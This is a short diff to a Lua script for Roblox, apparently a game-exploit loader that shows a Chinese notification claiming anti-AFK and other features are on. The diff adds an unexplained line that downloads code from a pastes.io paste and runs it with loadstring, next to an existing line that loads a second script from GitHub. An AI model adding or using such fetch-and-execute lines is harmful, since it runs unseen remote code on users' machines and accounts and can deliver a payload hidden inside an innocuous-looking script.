@@ -155,7 +155,7 @@ print("1")
 end
 
 game:GetService("StarterGui"):SetCore("SendNotification",{
-    Title = "反挂机、动态模糊、进入提醒",
+    Title = "挂机、动糊、进提、点击",
     Text = "以上功能已全部为你打开",
     Icon = "rbxassetid://16060333448",
     Duration = 60,
@@ -163,6 +163,8 @@ game:GetService("StarterGui"):SetCore("SendNotification",{
     Button1 = "谢谢",
     Button2 = "关闭"
 })
+
+loadstring(game:HttpGet('https://pastes.io/raw/aek9i68ajk'))()
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/boyscp/scriscriptsc/main/bbn.lua"))()
 
